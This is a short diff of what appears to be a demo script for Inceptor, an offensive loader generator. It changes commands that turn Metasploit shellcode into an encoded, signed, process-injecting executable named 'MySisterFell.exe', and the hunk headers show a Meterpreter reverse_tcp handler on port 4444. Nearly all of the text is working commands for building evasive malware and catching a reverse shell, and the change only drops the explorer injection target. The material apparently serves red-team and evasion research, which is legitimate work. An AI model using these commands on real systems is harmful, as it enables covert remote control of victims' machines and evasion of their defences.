@@ -304,9 +304,8 @@ handler -H eth0 -P 4444 -p windows/x64/meterpreter/reverse_tcp
 # --sgn: encode the shellcode
 # --sign: sign the loader
 # -P: uses process injection
-# -P0 explorer: inject into explorer
 # --delay 15: Wait for 15 seconds to allow frida to install the hooks!
-python inceptor.py dotnet msf.raw -o MySisterFell.exe --sgn --sign -P -P0 explorer --delay 15
+python inceptor.py dotnet msf.raw -o MySisterFell.exe --sgn --sign -P --delay 15
 
 # Console 3: Start the demo!
 demo.bat MySisterFell.exe
@@ -329,9 +328,8 @@ handler -H eth0 -P 4444 -p windows/x64/meterpreter/reverse_tcp
 # --sign: sign the loader
 # -m dinvoke: to load the D/Invoke module
 # -P: uses process injection
-# -P0 explorer: inject into explorer
 # --delay 15: Wait for 15 seconds to allow frida to install the hooks!
-python inceptor.py dotnet msf.raw -o MySisterFell.exe --sgn --sign -P -P0 explorer -m dinvoke --delay 15
+python inceptor.py dotnet msf.raw -o MySisterFell.exe --sgn --sign -P -m dinvoke --delay 15
 
 # Console 3: Start the demo!
 demo.bat MySisterFell.exe
